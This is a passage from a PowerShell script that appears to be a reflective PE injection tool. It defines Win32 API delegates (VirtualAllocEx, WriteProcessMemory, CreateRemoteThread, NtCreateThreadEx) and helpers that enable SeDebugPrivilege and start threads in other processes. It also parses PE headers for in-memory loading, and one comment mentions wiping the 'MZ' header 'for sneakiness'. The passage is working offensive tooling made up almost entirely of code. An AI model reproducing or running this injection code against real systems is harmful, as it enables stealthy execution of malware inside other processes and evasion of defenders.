		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
		[IntPtr]
		$EndAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
		[IntPtr]$FinalEndAddress = [IntPtr]::Zero
		if ($PsCmdlet.ParameterSetName -eq "Size")
		{
			[IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		}
		else
		{
			$FinalEndAddress = $EndAddress
		}
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
